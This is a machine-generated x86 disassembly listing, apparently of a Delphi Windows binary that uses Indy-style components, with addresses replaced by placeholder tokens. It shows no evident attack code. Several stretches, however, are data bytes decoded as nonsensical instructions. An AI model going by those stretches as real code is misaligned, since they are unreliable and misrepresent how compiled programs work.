push r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_483a6c
push [ ebp - 0x70 ]
push r-xdata
lea eax [ ebp - 0x6c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebx + 0x48 ]
call sub_408abc
push [ ebp - 0x78 ]
push r-xdata
lea eax [ ebp - 0x74 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x74 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx [ ebx + 0x24 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_47c084
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_4837e4
mov eax [ ebp - 0x50 ]
call sub_4043d8
test eax eax
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483848
sub_485b72
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov ebx eax
push 0x0
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
lea ecx [ ebp - 0x34 ]
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_475344
cmp [ ebp - 0x19 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485dd6
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
lea eax [ ebp - 0x7c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x7c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_479bfc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_485b6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ ebp - 0x18 ]
call sub_483a04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485b72
lea eax [ ebp - 0x18 ]
call sub_40d814
retn
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x44 ]
mov eax ebx
call sub_4837a8
mov eax [ ebp - 0x44 ]
call sub_4043d8
test eax eax
jne r-xdata
lea edx [ ebp - 0x48 ]
mov eax ebx
call sub_483a6c
mov eax [ ebp - 0x48 ]
call sub_4043d8
test eax eax
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483814
lea edx [ ebp - 0x4c ]
mov eax ebx
call sub_4837a8
mov eax [ ebp - 0x4c ]
mov edx r-xdata
call sub_404524
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483aa0
push r-xdata
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_4837e4
push [ ebp - 0x58 ]
push r-xdata
lea eax [ ebp - 0x54 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x48 ]
call sub_408abc
push [ ebp - 0x60 ]
push r-xdata
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_4837a8
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x64 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_483a6c
push [ ebp - 0x70 ]
push r-xdata
lea eax [ ebp - 0x6c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebx + 0x48 ]
call sub_408abc
push [ ebp - 0x78 ]
push r-xdata
lea eax [ ebp - 0x74 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x74 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx [ ebx + 0x24 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_47c084
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_4837e4
mov eax [ ebp - 0x50 ]
call sub_4043d8
test eax eax
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483848
sub_485dd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485e13
lea eax [ ebp - 0xa0 ]
mov edx 0x1b
call sub_40413c
lea eax [ ebp - 0x2c ]
call sub_404118
lea eax [ ebp - 0x20 ]
call sub_404118
lea eax [ ebp - 0x14 ]
call sub_404118
retn
sub_48612b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx ecx
mov esi edx
mov edi eax
cmp [ esi + 0x7c ] 0x0
je r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xa8 ]
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x7c ]
test bl bl
jne r-xdata
xor ecx ecx
mov edx [ esi + 0x68 ]
mov eax edi
call sub_47c084
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x7c ]
test bl bl
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xa4 ]
xor ecx ecx
mov edx [ esi + 0x34 ]
mov eax edi
call sub_47c084
jmp r-xdata
sub_486194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x30 ]
xor eax eax
push ebp
push sub_48622d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov edx esi
call sub_404524
je r-xdata
mov eax [ ebx ]
mov edx r-xdata
call sub_404524
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_484818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486234
cmp [ ebx ] 0x0
je r-xdata
push 0xffffffff
push ebx
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax esi
call sub_4043d8
test eax eax
jne r-xdata
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_419e40
jmp r-xdata
sub_48624f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_486334
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48633b
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_40413c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404638
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404524
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_486347
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_486375
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48637c
retn
sub_48638c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + ecx * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_48643c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4864 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
dec eax
add [ eax ] bl
add [ eax ] al
add al bl
inc cx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + ebx * 4 + 0x41 ] bh
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add al ch
cwde
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dl
add [ eax - 0x63 ] bl
inc ecx
add [ ebp + ebx * 4 + 0x41 ] bl
add [ eax ] dl
popfd
inc ecx
add [ ebx * 4 - 0x667fffbf ] dl
inc ecx
add ah bh
cdq
inc ecx
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
popad
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
enter 0x4864 0x0
pop es
adc al 0x54
dec ecx
dec ebp
jae r-xdata
pop ebx
retn
popad
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
test [ eax + ecx * 2 ] ah
test [ edi + 0x41 ] ah
add [ eax ] al
add [ ebx ] dl
dec ecx
dec ebp
jae r-xdata
call sub_419684
test bl bl
jle r-xdata
popad
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
mov eax eax
push ebx
push esi
test dl dl
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41964c
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_483e68
mov [ esi + 0x14 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_486548
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419684
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_486578
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48659d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4865a4
retn
sub_4865b4
adc [ 0x6e6f4c54 ] ecx
dec ecx
outsb
je r-xdata
xchg edx eax
dec ax
add [ eax + eax ] ah
add [ ebx + ecx * 2 ] ah
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah dh
dec eax
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
jb r-xdata
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x18004867 ] ah
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffff94000000 ] al
adc [ eax ] al
cmp al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
push eax
add [ eax ] al
add [ eax + edx + 0x540040 ] dl
add [ eax ] al
mov al 0x65
dec eax
add [ eax + eax ] bl
add [ eax + 0x60004865 ] dh
add [ eax ] al
add [ edx ] cl
push esp
dec ecx
dec ebp
popad
imul ebp [ edx + eax * 2 + 0x6f ] r-xdata
movsb [ edi ] [ esi ]
dec ax
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec ebp
popad
imul ebp [ edx + eax * 2 + 0x6f ] 0x48662c78
add [ ebx + ecx * 2 + 0x20047 ] dh
or [ ecx + 0x64 ] ecx
dec ebp
popad
imul ebp [ edx + eax * 2 + 0x6f ] 0x8b000078
sar bh 0xff
add ah dh
xchg edx eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx ] bh
inc eax
add [ ecx ] cl
dec ecx
dec ebp
popad
imul ebp [ edx + eax * 2 + 0x6f ] r-xdata
sub al 0x66
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x66 ] ah
dec eax
add [ esi + 0x48 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_486707
dec [ ecx ]
add [ eax ] al
add [ ebp + edx * 2 + 0x6e ] bl
insd
popad
jb r-xdata
add al 0xa0
pushfd
dec eax
add [ eax - 0x635fc7bd ] cl
dec eax
add [ eax + 0x438b3143 ] cl
inc eax
call sub_419994
pop ebx
retn
add [ fs : eax ] al
add [ ebx - 0x75 ] dl
fdiv [ ebx ]
ror [ ecx - 0x3fccb3bd ] 0x89
inc ebx
inc esp
xor eax eax
mov [ ebx + 0x58 ] eax
xor eax eax
mov [ ebx + 0x34 ] eax
lea eax [ ebx + 0x54 ]
call sub_404118
lea eax [ ebx + 0x50 ]
call sub_404118
lea eax [ ebx + 0x3c ]
call sub_404118
mov [ ebx + 0x48 ] 0x1
mov [ ebx + 0x30 ] 0x1
push 0x0
lea eax [ ebx + 0x5c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
push 0x0
lea eax [ ebx + 0x60 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov al [ r-xdata ]
mov [ ebx + 0x38 ] al
mov al [ r-xdata ]
mov [ ebx + 0x31 ] al
mov eax [ ebx + 0x40 ]
sub_4867a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419830
mov [ esi + 0x40 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4867f4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_486824
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_486860
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486867
retn
mov eax rw-data
mov ecx 0x4
mov edx [ r-xdata ]
call sub_404bb4
sub_486931
dec ebp
dec eax
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ecx + edi * 2 + 0x48 ] dl
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x46 ] ah
inc edi
add ah bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x4877 ] dh
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] bh
mov bl 0x47
add [ eax ] ch
mov edx 0xaebc0047
inc edi
add [ eax + esi * 4 - 0x3e2bffb9 ] bh
inc edi
add [ ebx + eax * 8 - 0x4e6fffb9 ] ah
inc edi
add [ eax ] ch
js r-xdata
add al bh
push esi
dec eax
add [ eax ] cl
push esp
dec eax
add [ eax + 0x62 ] bl
dec eax
add [ ecx ] dh
dec eax
add [ eax ] cl
push esp
dec ecx
dec ecx
dec ebp
inc ecx
push eax
xor al 0x8d
inc eax
add [ eax ] bl
push 0x48
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] dl
dec ecx
dec ebp
inc ecx
push eax
xor al 0x54
imul ecx [ eax ] r-xdata
sbb [ eax ] eax
pop es
dec ecx
dec ecx
dec ebp
inc ecx
push eax
xor al 0x6
add ah al
push 0x1000048
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
pop es
dec edi
outsb
inc ecx
insb
jb r-xdata
add [ eax ] dl
rol [ edi ] 0x58
mov bl 0x47
add al ah
mov bl 0x47
add [ eax - 0x4fffb84d ] al
mov ah 0x47
add [ edi + esi * 4 + 0x47 ] bl
add [ edx + edi * 4 ] bh
inc edi
add [ eax ] al
mov ebx 0xbe9c0047
inc edi
add ah bh
mov esi 0xbd340047
inc edi
add [ eax ] cl
int3
jmp eax
xchg esp eax
adc [ eax ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x61500800
jae r-xdata
inc eax
add ah bh
add [ eax ] al
ja r-xdata
sub [ eax ] dl
jb r-xdata
or [ ebp + 0x73 ] dl
jb r-xdata
je r-xdata
dec eax
inc ebp
dec esi
push esp
dec ecx
inc ebx
inc ecx
push esp
inc ebp
add [ eax ] al
add [ eax ] al
popad
insd
sub [ gs : eax ] dl
dec eax
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] dl
push edx
je r-xdata
jo r-xdata
imul esp [ ebp + 0x76 ] 0x536e4f65
insb
arpl [ gs : esp + edi + 0x10 ] si
add bh bh
jb r-xdata
xchg esp eax
adc [ eax ] al
loopne r-xdata
je r-xdata
add bh bh
loopne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ eax ] cl
push ebp
jae r-xdata
inc eax
add ah bl
add [ eax ] al
dec [ eax + eax + 0x1fe00 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x8f ] al
adc eax [ eax ]
add al 0x50
outsd
jb r-xdata
arpl [ esp + edi + 0x10 ] si
jb r-xdata
sub_4870bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_4871ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4873f8
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x2
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487206
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x3
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x4
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov edx 0x5
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
sub_487250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_487393
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4874f0
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x2
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48739a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x3
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x14 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx 0x4
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov edx 0x5
mov eax [ ebx + 0x80 ]
call sub_478f60
jmp r-xdata
sub_4873f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4874e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4874bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax esi
call sub_47b998
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x2a
jne r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ ebp - 0x8 ]
mov edx ebx
call sub_478d68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4874c3
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax esi
call sub_47b998
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0xc ]
push eax
mov eax ebx
call sub_4043d8
mov ecx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_408248
test al al
je r-xdata
sub_4874f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_487584
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_487567
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_47b998
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_478c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48756e
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
sub_487590
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_487600
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404524
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax ebx
call sub_4870bc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487607
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push esi
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
sub_48762c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp si 0xffff
jne r-xdata
mov [ ebp - 0x4 ] si
lea ebx [ ebp - 0x4 ]
push ebx
push 0x0
call sub_487590
push ebp
push 0xffffffff
call sub_487590
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_48765c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_487793
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47c9b4
xor edx edx
push ebp
push sub_487761
push [ fs : edx ]
mov [ fs : edx ] esp
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x6 ] 0x4
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_487250
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0xc ]
cmp eax 0x1
jne r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf4 ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xf0 ] edx
push 0x1
lea edx [ ebp - 0xc ]
